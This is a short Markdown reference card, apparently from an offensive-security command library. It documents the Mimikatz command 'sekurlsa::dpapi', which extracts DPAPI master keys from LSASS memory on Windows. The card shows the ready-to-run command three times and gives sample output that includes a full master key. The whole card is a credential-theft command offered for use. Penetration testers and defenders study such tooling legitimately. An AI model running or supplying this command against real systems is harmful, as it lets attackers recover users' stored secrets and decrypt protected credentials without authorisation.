---
type: command
executor: cmd
data: 'mimikatz.exe "sekurlsa::dpapi"'
platforms:
  - Windows
tags:
  - extraction
  - dpapi
  - mimikatz
  - lsass
verified: true
validated: true
---

# mimikatz-sekurlsa-dpapi-find-masterkey

## Command

```cmd
mimikatz.exe "sekurlsa::dpapi"
```

## Description

Extracts DPAPI master key information from LSASS memory using Mimikatz's Sekurlsa module.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|

## Examples

### Basic Usage

```cmd
mimikatz.exe "sekurlsa::dpapi"
```

## Expected Output

```
DPAPI    : GUID={3e90dd9e-f901-40a1-b691-84d7f647b8fe}
SHA1     : 95664450 d90eb2ce 9a8b1933 f823b905 10b61374 ...
SHA256   : ...
MasterKey: 95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
```

## Related

- [[procedures/Windows-DPAPI-Credential-Retrieval-with-Mimikatz]]
